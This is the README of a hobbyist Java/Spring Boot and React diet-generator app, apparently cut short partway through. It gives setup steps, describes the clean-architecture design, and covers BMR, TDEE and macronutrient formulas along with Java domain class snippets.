https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc?trackingId=074SlSqIoJkEJFEkOC98QA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3B68UQVWs4SiW1kIcA14PsKg%3D%3D', 'here -> https://www.linkedin.com/pulse/detect-ai-hallucinations-rag-routing-branching-chaining-vishal-mysore-jrzic', 'here -> https://www.linkedin.com/pulse/ai-bias-what-does-mean-vishal-mysore-0atsc']",21
undermad/diet-generator-api,main,"# Fatatu - Diet Generator

![C2 screenshot](/screenshots/fatatu_logo.png)

## Technology Stack

### Backend

![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring Boot](https://img.shields.io/badge/Spring%20Boot-6DB33F?style=for-the-badge&logo=spring-boot&logoColor=white)
![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white)
![Apache Maven](https://img.shields.io/badge/Apache%20Maven-C71A36?style=for-the-badge&logo=Apache%20Maven&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)

### Frontend

![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)
![React](https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB)
![Vite](https://img.shields.io/badge/vite-%23646CFF.svg?style=for-the-badge&logo=vite&logoColor=white)
![NPM](https://img.shields.io/badge/NPM-%23CB3837.svg?style=for-the-badge&logo=npm&logoColor=white)
![MaterialUI](https://img.shields.io/badge/Material--UI-007FFF?style=for-the-badge&logo=mui&logoColor=white)

# LIVE APPLICATION <-- [https://www.fatatu.com](https://www.fatatu.com)

The application has been deployed. You are welcome to play with it, is relative simple and satisfying to use.

# HOW TO RUN IT ON YOUR LOCAL MACHINE

---

## 1. Make sure you have Docker and Docker Compose installed.

Install Docker [LINK](https://docs.docker.com/engine/install/)

Install Docker Compose [LINK](https://docs.docker.com/compose/install/)

## 2. Obtain CalorieNinjas API Key

To use this application you need API Key from CalorieNinjas. Registration is straight forward, easy and quick. Free tier
allows
to perform 10000 requests per month what is definitely sufficient.

Registration under this [LINK](https://www.calorieninjas.com/register)

If you are logged in, go to MyAccount section or click this [LINK](https://calorieninjas.com/profile) and copy the API
Key after clicking 'Show API Key'.

## 3. Install Git

If Git is not installed yet on your machine just follow the instructions under
this [LINK](https://github.com/git-guides/install-git).

## 4. Clone GitHub Repository

From command line, navigate to your folder of choose

```
git clone https://github.com/undermad/diet-generator-api
```

Move to the cloned repository

```
cd diet-generator-api
```

## 5. Set environment variable

Create `.env` file in root folder (diet-generator-api), open it using any text editor and add the line:

```
NINJA_API_KEY=YOUR_API_KEY
```

Replace `YOUR_API_KEY` with the key from CalorieNinjas.

## 6. Start Docker Compose

Start Docker Compose (Make sure Docker is running)
It may take several minutes to download all dependencies, be patient and enjoy the application.

```
docker compose up
```

Once docker containers are running you can access the presentation website under this [LINK](http://localhost:5173/) or
enter directly in your browser `http://localhost:5173/`.
API base url is as follow `http://localhost:8080/api/v1/`. See presentation layer documentation to discover available
endpoints or visit [SWAGGER](http://localhost:8080/swagger-ui/index.html) / `http://localhost:8080/swagger-ui/index.html`

# 100 Commits!

---

![Proteins Code screenshot](/screenshots/100commitow_ss.png)

This application was developed for the competitive event ""100 Commits"" organized by DevMentors.

The primary objective of the competition is to create an original Open Source project over the course of 100 days.

The rules are simple:

Participants must make at least one commit to the main branch of their registered repository every day. There is some
flexibility allowed—each participant can take one day off without a commit, referred to as a ""JOKER"" day.

The grand prize for the winner is a MacBook Pro M3.

For more information, visit the official website.  [LINK](https://100commitow.pl/)

Checkout DevMentors on YouTube. [PL](https://www.youtube.com/@DevMentorsPL)
or [ENG](https://www.youtube.com/@DevMentorsEN)

# DOCUMENTATION

1. [Introduction](#1-introduction)
   
   1.1 [About Importance of Documentation](#11-about-importance-of-documentation) 

   1.2 [What is Fatatu?](#12-what-is-fatatu)

   1.3 [Why this repository exist?](#13-why-this-repository-exists)
   
   1.4 [Disclaimer](#14-disclaimer)

   1.5 [Star and share](#15-star-and-share)

2. [Architecture](#2-architecture)

   2.1 [Clean Architecture](#21-clean-architecture)

   2.2 [C4 Model](#22-c4-model)

   2.2.1 [C1 System Context](#221-c1-system-context)

   2.2.2 [C2 Container](#222-c2-container)

   2.2.3 [C3 Component](#223-c3-component)

   2.2.4 [C4 Code Calculator Component](#224-c4-code---calculator-component)

   2.2.4 [C1 Diet Component](#224-c4-code---diet-generator-component)

   2.2.4 [C1 Ninja Service Component](#224-c4-code---ninja-service-component)

3. [Domain](#3-domain)

   3.1 [How human body works](#31-how-human-body-works)

   3.1.1 [How kcal works](#311-how-kcal-works)

   3.1.2 [BMI](#312-bmi)

   3.1.3 [TDEE](#313-tdee)

   3.1.4 [TEF](#314-tef)

   3.2 [Data Representation](#32-data-representation)

   3.2.1 [Product](#321-product)

   3.2.2 [Filler](#322-filler)

   3.2.3 [Nutrients](#323-nutrients)

   3.2.4 [Recipe](#324-recipe)

   3.2.5 [MealType](#325-mealtype)

   3.2.6 [DietType](#326-diettype)

   3.2.7 [BigDecimal](#327-bigdecimal)

   3.2.8 [Dish](#328-dish)

   3.2.9 [Diet](#329-diet)

   3.3 [Calculators](#33-calculators)

   3.3.1 [BMICalculator](#331-bmicalculator)

   3.3.2 [BMRCalculator](#332-bmrcalculator)

   3.3.3 [MacroCalculator](#333-macrocalculator)

   3.4 [Generators](#34-generators)

   3.4.1 [DietGenerator](#341-dietgenerator)

   3.4.2 [ShoppingListGenerator](#342-shoppinglistgenerator)

4. [Application](#4-application)

   4.1 [Repositories](#41-repositories)

   4.1 [Use Cases](#42-use-cases)

5. [Infrastructure](#5-infrastructure)

   5.1 [Spring Boot configuration](#51-spring-boot-configuration)

   5.1.1 [Bean Configuration](#511-bean-configuration)

   5.1.2 [Cors Configuration](#512-cors-configuration)

   5.1.3 [Error Handling](#513-error-handling)

   5.2 [Calories Ninjas](#52-calories-ninjas)

   5.3 [Persistence](#53-persistence)

   5.3.1 [Documents](#531-documents)

   5.3.2 [Mappers](#532-mappers)

   5.3.3 [Repositories](#533-repositories)

6. [Presentation](#6-presentation)

   6.1 [Controllers endpoints](#61-controllers-endpoints)

7. [Docker](#7-docker)
8. [Inspiration](#8-inspirations)







# 1. Introduction

---

### 1.1 About Importance of Documentation

Wherever I go, I constantly hear about the importance of documentation in software development. Many times, I've tried
to use a library only to find that the lack of proper documentation made it incredibly difficult to understand and
implement. This experience underscores a critical point: if we, as software developers, want to build software
effectively as teams, we must pay close attention to how we explain our thoughts and code. Good documentation is not
just a nice-to-have; it is essential for collaboration, maintenance, and onboarding new team members. It bridges the gap
between developers' intentions and users' understanding, ensuring that our work is accessible and usable by others.
Without it, even the most elegant code can become an impenetrable black box, hindering productivity and innovation.

### 1.2 What is Fatatu?

Fatatu is a diet generator application that will generate a list of meals with all ingredients and nutrition information
based on provided criteria such as required kcal, diet targets, diet type, etc.
In addition, each diet will provide a shopping list.

With one click you can get a diet and go straight to the shop and buy what you need, you don't need to waste time on
browsing for recipes or adjusting macros. This application will do it for you.

### 1.3 Why this repository exists?

**First reason:** This application was created as an idea that I had in mind for a couple of months/years, and finally I
decided to create it.

**Second reason:** [100commits](https://100commitow.pl/) competitive event gave me motivation to begin this project and
push my skills to the next level.

**Third reason:** I found that creating applications from beginning to the end including deployment is extremely
beneficial in
improving my skills as a Software Developer. With this repository, I decided to learn MongoDB, apply clean architecture,
and
implement comprehensive documentation.

### 1.4 Disclaimer

I am a beginner software developer with less than 2 years of experience who do it as a hobby. I never work in a
professional
environment. I learn everything from books, online courses,
documentation, blogs, forums, YouTube, and AI. Forgive me if something isn't okay in this repo.

### 1.5 Star and share

If you like my work here, you can appreciate me with the star and perhaps share this application with your friends.

Happy coding!

# 2. Architecture

---

This application is simple monolith that utilize clean architecture approach.


## 2.1 Clean Architecture

Clean Architecture, introduced by Robert C. Martin, offers numerous benefits for backend applications. It enforces a
clear separation of concerns, enhancing code manageability and comprehension. This structure improves testability by
decoupling business logic from external dependencies, leading to more robust code. The modularity of Clean Architecture
increases flexibility and maintainability, allowing changes in one part of the application without impacting others. It
also promotes independence from specific frameworks.

Sure, here's a concise overview of each layer in Clean Architecture:

1. Presentation Layer
    - Responsibility: Manages user interactions.
    - Components: UIs, Views, Controllers.
    - Function: Interprets user inputs, displays data.
    - Dependency: Depends on the Application layer.
2. Domain Layer
    - Responsibility: Core business logic and rules.
    - Components: Entities, Value Objects, Domain Services.
    - Function: Defines business concepts and rules.
    - Dependency: Independent, no dependencies.
3. Application Layer
    - Responsibility: Orchestrates business operations.
    - Components: Use Cases, Application Services.
    - Function: Executes operations and coordinates data flow.
    - Dependency: Depends on the Domain layer.
4. Infrastructure Layer
    - Responsibility: Provides technical implementations.
    - Components: Databases, External APIs, Frameworks.
    - Function: Handles technical details and concrete implementations.
    - Dependency: Depends on all other layers.

In the diagram below, we can clearly see that the domain layer doesn't know anything about the application layer. The
same applies to the application layer; it has knowledge about the domain but doesn't know anything about the
infrastructure or presentation layers.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-layer-diagram.png)

Here is another popular diagram that describe clean architecture.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-circle-diagram.webp)

Apart the separation of concerns, another main goal is to keep domain and application layer completely clear from any
frameworks or libraries.
This was nearly archived. The application use lombok library in domain and application layers. Lombok is
lightweight library and allow us to reduce lots of boilerplate code. On the screen we can see usage of lombok
in `Recipe` class where is 10 fields in total. We literally reduced 100 lines of code just to 4 lines.

![Lombok Diagram screenshot](/screenshots/lombok_ss.png)

You may wonder how application layer receive data from database without knowing anything about the infrastructure layer.
The solution is quite interesting. In application layer we create interfaces that are templates and doesn't have any
logic.
Those interfaces are implemented by the infrastructure layer and application layer doesn't need to know how it was done.
UseCase implementation belong to application layer, and usually it need some data from the database. To solve that
problem we simply register
`UseCaseImpl` with `@Bean` in infrastructure layer in `BeanConfiguration` class where we also inject our implementation
of required repository.
As you can see we separate application and domain layers from framework (Spring in this case) completely.

Diagram below show tha basic sample implementation.

![Bean Registration Diagram screenshot](/screenshots/beanregistration_diagram.png)

This approach give us lots of flexibility. We can change our database or the whole framework.
We can rewrite whole infrastructure layer without changing even 1 line in application or domain layers.
Well, in fact our core still depends on infrastructure and presentation layers, those need to be there, but the borders
are clearly created.

Packages according to the clean architecture are presented below:

![Packages screenshot](/screenshots/package_structure_ss.png)

### 2.2 C4 Model

""The C4 model was created as a way to help software development teams describe and communicate software architecture,
both during up-front design sessions and when retrospectively documenting an existing codebase. It's a way to create
maps of your code, at various levels of detail, in the same way you would use something like Google Maps to zoom in and
out of an area you are interested in.""

You can read more about C4 Model at this [LINK](https://c4model.com/)

The C4 model has 4 parts:

### 2.2.1 C1 System Context

![C1 screenshot](/screenshots/c1planning.png)

### 2.2.2 C2 Container

![C2 screenshot](/screenshots/c2planning.png)

### 2.2.3 C3 Component

![C3 screenshot](/screenshots/c3planning.png)

### 2.2.4 C4 Code - Calculator Component

![C4 screenshot](/screenshots/calculator_component_diagram_ss.png)

### 2.2.4 C4 Code - Diet Generator Component

![C4 screenshot](/screenshots/generator_component_ss.png)

### 2.2.4 C4 Code - Ninja Service Component

![C4 screenshot](/screenshots/ninja_service_ss.png)

# 3. Domain

---

To understand this application first we need to possess the knowledge how human bodies works.

## 3.1 How human body works

### 3.1.1 How kcal Works:

Calories are a measure of energy, and when we talk about food energy, we use the term kilocalories (kcal), commonly
referred to simply as ""calories"" in everyday language. The concept of calorie intake, expenditure, and deficit is
central to understanding weight management.

**Energy Source**: The food we eat provides energy measured in kcal. This energy fuels our body's basic functions (like
breathing and blood circulation), physical activities, and the processing of food itself.

**Energy Expenditure**: Our body uses the energy in several ways:

* Basal Metabolic Rate (BMR): The energy needed for basic functions at rest.
* Physical Activity: The energy expended through exercise and routine daily movements.
* Thermic Effect of Food (TEF): The energy used to digest, absorb, and metabolize food.

Weight management depends on the balance between energy intake (the calories you consume) and energy
expenditure (the calories you burn).

`Change in body weight = Calories consumed − Calories expended`

The number of calories (kcal) required for a person depends on various factors
such as age, gender, weight, height, and physical activity level.

### 3.1.2 BMI

Calculating your Basal Metabolic Rate (BMR) helps you understand how many calories your body needs at rest to maintain
basic physiological functions. The BMR can be estimated using several formulas, with the Harris-Benedict Equation and
the Mifflin-St Jeor Equation being the most commonly used.

This application currently supports the Mifflin-St Jeor equation

Male equation `BMR = (10 × weight in kg) + (6.25 × height in cm)  − (5 × age in years) + 5`

Female equation `BMR = (10 × weight in kg) + (6.25 × height in cm) − (5 × age in years) − 161`

### 3.1.3 TDEE

To calculate the total daily energy expenditure (TDEE), which represents the total number of calories needed to maintain
your current weight, you multiply your Basal Metabolic Rate (BMR) by an activity factor:

- Sedentary (little or no exercise): BMR × 1.2
- Lightly active (light exercise/sports 1-3 days/week): BMR × 1.375
- Moderately active (moderate exercise/sports 3-5 days/week): BMR × 1.55
- Very active (hard exercise/sports 6-7 days a week): BMR × 1.725
- Super active (very hard exercise/sports & a physical job): BMR × 1.9

### 3.1.4 TEF

Calculating thermic effect of food (TEF) is not necessary for average person and currently is not supported. This may
change in the future.

## 3.2 Data representation

The main business entities are `Diet`, `Dish`, `Product`, `Recipe` and `Nutrients`. The application create `Diet` object
that consist
of multiple
`Dish` objects. Those dishes are created from `Recipe` and `Product` objects using `DietGenerator` where special
algorithm is implemented to adjust the `Macronutrient` requirements.
First, lets look closer at `Recipe` and `Product` objects and their sub-objects to understood better how fundamental
data is
represented.

### 3.2.1 Product

```java
public class Product {

    private UUID id;
    private String name;
    private Nutrients nutrients;
    private Filler filler;
}
```

[//]: # (![Product Code screenshot]&#40;/screenshots/product_code_ss.png&#41;)

The Product object is depicted as shown in the screenshot. Besides the obvious fields - name and id (1:1 database
representation), there are two important fields - Nutrients and Filler. During database initialization, products are
fetched from CalorieNinjas
and marked with the appropriate filler. Based on this Filler, the DietGenerator decides if a product can be used to
increase or decrease macronutrients. `Nutrients` is representation of calories, carbohydrates, fats and proteins per
100g of the products.

### 3.2.2 Filler

The `Filler` enum is used to mark products to indicate if a product can be used to adjust macronutrients. In this
application
fillers are set up manually for best and controlled result, but algorithm can be implemented to decide if product is
suitable to be a Filler.

```java
public enum Filler {

    PROTEIN(""Protein""),
    FAT(""Fat""),
    CARBOHYDRATE(""Carbohydrate""),
    NONE(""None"");
}
```

[//]: # (![Filler Code screenshot]&#40;/screenshots/filler_code_ss.png&#41;)

### 3.2.3 Nutrients

```java
public class Nutrients {

    private Calories calories;
    private Carbohydrates carbohydrates;
    private Proteins proteins;
    private Fats fats;
}
```

[//]: # (![Nutrients Code screenshot]&#40;/screenshots/nutrients_code_ss.png&#41;)

The `Nutrients` object contains 3 basic public methods - addNutrients, subtractNutrients and createEmptyNutrients. First
two
return void and take another Nutrients object as parameter.
Those one are widely use across the application to perform subtraction and addition of the nutrients. The last method is
static and is used as starting point for new nutrient calculations.

Calories, Carbohydrates, Proteins and Fats are the classes that holds more specific information and are some kind of
wrappers.

Calories:

```java
public class Calories {
    private BigDecimal totalCalories;
}
```

[//]: # (![Calories Code screenshot]&#40;/screenshots/calories_code_ss.png&#41;)

Carbohydrates:

```java
public class Carbohydrates {
    private BigDecimal totalCarbohydrates;
    private BigDecimal fiber;
    private BigDecimal sugar;
}
```

[//]: # (![Carbohydrates Code screenshot]&#40;/screenshots/carbohydrates_code_ss.png&#41;)

Proteins:

```java
public class Proteins {
    private BigDecimal totalProteins;
}
```

[//]: # (![Proteins Code screenshot]&#40;/screenshots/proteins_code_ss.png&#41;)

Fats:

```java
public class Fats {
    private BigDecimal totalFats;
    private BigDecimal saturatedFats;
}
```

[//]: # (![Fats Code screenshot]&#40;/screenshots/fats_code_ss.png&#41;)

Every of those wrappers contain totalValue field and that is actual field that is used to perform calculations. Let's
look at `Fats` wrapper.
It has totalFats and saturatedFats fields. The saturatedFats amount is part of totalFats value and as you can see the ""
normal"" fats are not listed in the structure.
If you want to get the value of fats WITHOUT saturatedFats you need to perform your own
subtraction `totalFats - saturatedFats`. Knowing this may be useful if you decide to implement glycemic load where you
use value of carbohydrates excluding fiber. For now, glycemic load is not supported in this application and this may
change in the future.

### 3.2.4 Recipe

```java
public class Recipe {

    private UUID id;
    private String name;
    private Map<Product, BigDecimal> ingredientsProportion;
    private Nutrients nutrients;
    private BigDecimal basePortionInGrams;
    private boolean isScalable;
    private String howToPrepare;
    private List<DietType> dietTypes;
    private List<MealType> mealTypes;
    private Set<Filler> scalableFillers;
}
```

[//]: # (![Recipe Code screenshot]&#40;/screenshots/recipe_code_ss.png&#41;)

The `Recipe` object that are used to create base dish during diet creation. It has some useful information such as
dietType that indicate for which diet it can be used, mealTypes that indicate for which meal it can be used. The
ingredientsProportion field store the information about percentage ratio of each `Product` in the recipe. This will
guarantee
the same taste of the base portion when ever we decide to create large or small portion. When we adjust the
macronutrients using
product marked as fillers the ingredients ratio will change but the starting point will be always the same.
It also has a `Nutrients` object that represent nutrition information per 100g of the product.

### 3.2.5 MealType

The `MealType` is simple enum that contain supported meals. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet.

```java
public enum MealType {

    BREAKFAST(""Breakfast""),
    LUNCH(""Lunch""),
    DINNER(""Dinner""),
    SNACK(""Snack"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/mealtype_code_ss.png&#41;)

### 3.2.6 DietType

The `DietType` is simple enum that contain supported diets. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet. Currently, application support only one type: ""High Protein"". This can be very
easily extended. Each `DietType` has its own `MacroCalculator`.

```java
public enum DietType {

    PROTEIN(""High Protein"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/diettype_code_ss.png&#41;)

### 3.2.7 BigDecimal

In domain application layer, build in Java class `BigDecimal` is used to perform calculation instead of primitive
variables.
This class support basic math operations including very useful rounding by `RoundingMode` enum. Example usage:

```java
    private BigDecimal calculateCarbohydrates(BigDecimal requiredCalories, BigDecimal totalProteins, BigDecimal totalFats) {
    BigDecimal caloriesLeft = requiredCalories
            .subtract(totalProteins.multiply(BigDecimal.valueOf(4)))
            .subtract(totalFats.multiply(BigDecimal.valueOf(9)));
    return caloriesLeft.divide(BigDecimal.valueOf(4), 1, RoundingMode.HALF_UP);
}
```

[//]: # (![BigDecimal Code Usage screenshot]&#40;/screenshots/bigdecimal_code_example_ss.png&#41;)

Presented method is located in `HighProteinMacroCalculator` and contains chain subtraction, multiplication and division.
Note that scale 1 with `RoundingMode.HALF_UP` has been used to round result to 1 decimal place. Result of multiplication
is used as subtrahend for subtraction.

### 3.2.8 Dish

The `Dish` class is final meal representation class and it is result of `DietGenerator`. This class has factory method
that take `Recipe` and amount of
calories that dish has to has. The productsToGram holds the `Product` to actual value in grams required for that dish
as `BigDecimal`.
`Nutrients` object in this class holds the information about the total nutrients information for the whole meal(--->NOT
PER 100g<---). The recipe filed is the recipe that this dish has been created from. The `Dish` class also contains some
methods that are used to adjust macronutrients.

```java
public class Dish {

    private final Map<Product, BigDecimal> productToGrams;
    private final Nutrients nutrients;
    private final Recipe recipe;
    private final Map<Filler, Integer> numberOfFillers;
}
```

[//]: # (![Dish Code screenshot]&#40;/screenshots/dish_code_ss.png&#41;)

### 3.2.9 Diet

The `Diet` class is final diet representation class and it is returned by `DietGenerator` generateDiet method. It
contains list of dishes that are adjusted to the given `Macronutrient`, total `Nutrients` for the whole diet and
shoppingList that is simple name of the product to the amount in grams. The `Diet` class also contains some methods to
adjust macronutrients.

```java
public class Diet {

    private List<Dish> dishes;
    private Nutrients nutrients;
    private Map<String, Double> shoppingList;
}
```

[//]: # (![Diet Code screenshot]&#40;/screenshots/diet_code_ss.png&#41;)

## 3.3 Calculators

The application features three distinct calculators: `BMICalculator`, `BMRCalculator`, and `MacroCalculator`. The first
two, are standalone calculators. The application includes a dedicated controller
`CalculatorController`, with two endpoints to facilitate their use. The third calculator, `MacroCalculator`, is
particularly important as it is used to create the `Macronutrient` object for the `DietGenerator`.

### 3.3.1 BMICalculator

The `BMICalculator` is simple calculator that return BMI value for given parameters. It has only one static default
method calculate that take 2 parameters - bodyWeightInKg and heightInCm.

The BMI formula utilize metric system and is as follows:

`BMI = bodyWeightInKg / heightInMeters^2`

As you can see on the screen, heightInCm is converted to meters.

```java
public interface BMICalculator {

    static BigDecimal calculate(BigDecimal bodyWeightInKg, BigDecimal heightInCm) {
        if (bodyWeightInKg == null || bodyWeightInKg.doubleValue() <= 0 || heightInCm == null || heightInCm.doubleValue() <= 0)
            return BigDecimal.valueOf(0);

        BigDecimal heightInMeters = heightInCm.divide(new BigDecimal(""100""), new MathContext(3, RoundingMode.HALF_DOWN));
        BigDecimal heightSquared = heightInMeters.multiply(heightInMeters, new MathContext(3, RoundingMode.HALF_DOWN));
        return bodyWeightInKg.divide(heightSquared, new MathContext(3, RoundingMode.HALF_UP));
    }
}
```

[//]: # (![BMICalculator Code screenshot]&#40;/screenshots/bmicalculator_code_ss.png&#41;)

### 3.3.2 BMRCalculator

The `BMRCalculator` is an interface with a single method, calculate, which returns a `BaseMetabolicRate` object. This
method
takes one parameter, `BMRAttributes`, and is implemented by the `MifflinStJeorCalculator`. Other equations can also be
implemented using the `BMRCalculator` interface.

```java
public interface BMRCalculator {
    BaseMetabolicRate calculate(BMRAttributes bmrAttributes);
}
```

[//]: # (![BMRCalculator Code screenshot]&#40;/screenshots/bmrcalculator_code_ss.png&#41;)

This application currently support MifflinStJeor equations which is:

Male: `BMR = ( 10 × bodyWeightInKg in kg ) + ( 6.25 × heightInCm in cm ) − ( 5 × age in years ) + 5`

Female: `BMR=( 10 × bodyWeightInKg in kg ) + ( 6.25 × heightInCm in cm ) − ( 5 × age in years ) − 161`

```java
public class MifflinStJeorCalculator implements BMRCalculator {

    @Override
    public BaseMetabolicRate calculate(BMRAttributes bmrAttributes) {
        if (bmrAttributes == null) return new BaseMetabolicRate(BigDecimal.valueOf(0));
        if (bmrAttributes.getGender() == Gender.MALE)
            return calculateUsingMaleEquation(bmrAttributes);
        else return calculateUsingFemaleEquation(bmrAttributes);
    }
}
```

[//]: # (![MifflinCalculator Code screenshot]&#40;/screenshots/mifflinstjeorcalculator_code_ss.png&#41;)

The `BMRAttributes` are presented below:

```java
public class BMRAttributes {
    private BigDecimal bodyWeightInKg;
    private BigDecimal heightInCm;
    private BigDecimal age;
    private ActiveLevel activeLevel;
    private Gender gender;
}
```

[//]: # (![BMRAttributes Code screenshot]&#40;/screenshots/bmrattributes_code_ss.png&#41;)

The `BaseMetabolicRate` object, created by the `MacroCalculator`, contains the actual value and has a single method,
`calculateTDEE`. This method takes one parameter, `ActiveLevel`. Based on the provided activity level, the base
metabolic
rate is multiplied, and the result is returned as a `BigDecimal`.

```java
public class BaseMetabolicRate {
    private BigDecimal BMR;

    public BigDecimal calculateTDEE(ActiveLevel activeLevel) {
        if (activeLevel == null) return BigDecimal.valueOf(0);
        BigDecimal multiplayer = BigDecimal.valueOf(activeLevel.getMultiplayer());
        return multiplayer.multiply(BMR).setScale(2, RoundingMode.HALF_DOWN);
    }
}
```

[//]: # (![BaseMetabolicRate Code screenshot]&#40;/screenshots/basemetabolicrate_code_ss.png&#41;)

The `ActiveLevel` enum is presented below:

```java
public enum ActiveLevel {
    SEDENTARY(1.2),
    LIGHTLY(1.375),
    MODERATELY(1.55),
    VERY(1.725),
    SUPER(1.9);
}
```

[//]: # (![ActiveLevel Code screenshot]&#40;/screenshots/activelevel_code_ss.png&#41;)

### 3.3.3 MacroCalculator

The `MacroCalculator` is a sealed interface with a single method, `calculate`, which returns a `Macronutrient` object
and
takes one parameter, `MacroCalculatorAttributes`. Each `DietType` requires its own `MacroCalculator` implementation, as
each
diet needs a different approach to macronutrients. For example, an average person who doesn't train should not consume
the same amount of protein as someone who engages in three resistance training sessions per week.

```java
public sealed interface MacroCalculator permits HighProteinMacroCalculator {
    Macronutrient calculate(MacroCalculatorAttributes requiredCalories);
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculator_code_ss.png&#41;)

The `MacroCalculator` is created by `MacroCalculatorFactory`.

```java
public class MacroCalculatorFactory {
    public static MacroCalculator getMacroCalculator(DietType dietType) {
        return switch (dietType) {
            case PROTEIN -> new HighProteinMacroCalculator();
            default -> throw new WrongInputException(""Unknown diet type"");
        };
    }
}
```

[//]: # (![MacroCalculatorFactory Code screenshot]&#40;/screenshots/macrocalculatorfactory_code_ss.png&#41;)

The `MacroCalculatorAttributes` is simple record that holds necessary information.

```java
public record MacroCalculatorAttributes(BigDecimal requiredCalories, BigDecimal bodyWeightInKg, Gender gender) {
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculatorattributes_code_ss.png&#41;)

The `HighProteinMacroCalculator` is the actual implementation of the `MacroCalculator` and uses its own equation.
Macronutrients are calculated in the order of protein, fats, and carbohydrates.

It is essential to note that each gram of protein and carbohydrate equals 4 kcal, and each gram of fat equals 9 kcal.
These values remain consistent across all diet types.

Proteins: `(2.2g MALE or 1.6g FEMALE) x Body Weight`

Fats: `30% of total caloric intake`

Carbohydrates: `Calculated as the remaining calories after proteins and fats`

Example: Male 100kg that requested 3000kcal diet.

Proteins: `2.2 x 100 = 220g` per day that are `220g x 4kcal = 880kcal` of total daily intake.

Fats: `0.3 x 3000kcal = 900kcal` of total daily intake that are `900 / 9kcal = 100g` of fats.

Carbohydrates: `3000 - (880kcal + 900kcal) = 1220kcal` of total daily intake that are `1220 / 4kcal = 305g`of
carbohydrates per day.

```java
public final class HighProteinMacroCalculator implements MacroCalculator {

    @Override
    public Macronutrient calculate(MacroCalculatorAttributes attributes) {
        if (attributes == null || attributes.requiredCalories() == null || attributes.bodyWeightInKg() == null || attributes.gender() == null) {
            return new Macronutrient(BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0));
        }
        BigDecimal totalProtein = calculateTotalProtein(attributes.bodyWeightInKg(), attributes.gender());
        BigDecimal totalFats = calculateTotalFats(attributes.requiredCalories());
        BigDecimal totalCarbohydrates = calculateCarbohydrates(attributes.requiredCalories(), totalProtein, totalFats);
        return new Macronutrient(attributes.requiredCalories(), totalProtein, totalFats, totalCarbohydrates);
    }
}

```

[//]: # (![HighProteinMacroCalculator Code screenshot]&#40;/screenshots/highproteinmacrocalculator_code_ss.png&#41;)

The `Macronutrient` serves as a holder for calculated values and is used in the `DietGenerator` to determine whether the
values need to be increased or decreased in the diet. It also has two methods, `reduceValues` and `increaseValues`,
which
take `Nutrients` as a parameter.

```java
public class Macronutrient {
    private BigDecimal calories;
    private BigDecimal proteins;
    private BigDecimal fats;
    private BigDecimal carbohydrates;
}
```

[//]: # (![Macronutrient Code screenshot]&#40;/screenshots/macronutrient_code_ss.png&#41;)

## 3.4 Generators

The application has 2 generators - `ShoppingListGenerator` and `DietGenerator`. First one is very simple, where the
second is rather complex.

### 3.4.1 DietGenerator

The `DietGenerator` is an interface with a single method, `generateDiet`, which does not take any parameters and returns
a
`Diet` object. This interface can be implemented to provide a new generator. In the current application, `DietGenerator`
is
implemented by the `DietGeneratorImpl` class, and this section is dedicated to that implementation.

The `DietGeneratorImpl` is an object created separately for each diet and is garbage collected after the request is
completed. To create it, you need `numberOfMeals` as a `BigDecimal`, a `Macronutrient`, and
a `Map<MealType, List<Recipe>>`. In addition to basic initialization in the constructor, 10% of the total requested
calories is reserved for
macronutrient adjustment. The baseCaloriesPerMeal field is created by subtracting the reserved calories from the total
calories and dividing it by numberOfMeals.

`baseCaloriesPerMeal = (totalCalories - (totalCalories * 0.1)) / numberOfMeals`

```java
public class DietGeneratorImpl implements DietGenerator {

    private final Random random;
    private final Map<MealType, List<Recipe>> recipes;
    private final Macronutrient missingMacronutrients;
    private final BigDecimal numberOfMeals;
    private final BigDecimal baseCaloriesPerMeal;


    public DietGeneratorImpl(BigDecimal numberOfMeals, Macronutrient missingMacronutrients, Map<MealType, List<Recipe>> recipes) {
        this.missingMacronutrients = missingMacronutrients;
        this.numberOfMeals = numberOfMeals;
        BigDecimal reservedCalories = missingMacronutrients.getCalories().multiply(BigDecimal.valueOf(0.1));
        BigDecimal requiredCaloriesAfterReservation = missingMacronutrients.getCalories().subtract(reservedCalories);
        this.baseCaloriesPerMeal = requiredCaloriesAfterReservation.divide(numberOfMeals, 2, RoundingMode.DOWN);
        this.random = new Random();
        this.recipes = recipes;
    }
}
```

[//]: # (![DietGeneratorImpl members and constructor Code screenshot]&#40;/screenshots/dietgeneratorfieldconstructor_code_ss.png&#41;)

After the `DietGeneratorImpl` is created, it contains all the necessary information to generate the diet. This includes
a
lists of `Recipe` for each `MealType`, the required `Macronutrient`, the
requested `numberOfMeals`, `baseCaloriesPerMeal`, and a
`Random` object for later usage.

```java

@Override
public Diet generateDiet() {
    Diet diet = new Diet();
    addDishes(diet);
    adjustMacronutrients(diet);
    diet.setShoppingList(ShoppingListGenerator.generateShoppingList(diet));
    return diet;
}
```

[//]: # (![DietGeneratorImpl generate Code screenshot]&#40;/screenshots/dietgeneratorgenerate_code_ss.png&#41;)

There are three main steps in diet creation, `addDishes`, `adjustMacronutrients` and `generateShoppingList`.

The `addDishes` method:

```java
    private void addDishes(Diet diet) {
    addDish(diet, MealType.BREAKFAST);
    for (int i = 1; i < numberOfMeals.doubleValue() - 1; i++) {
        if (i == 3) {
            addDish(diet, MealType.SNACK);
            continue;
        }
        addDish(diet, MealType.LUNCH);
    }
    addDish(diet, MealType.DINNER);
}
```

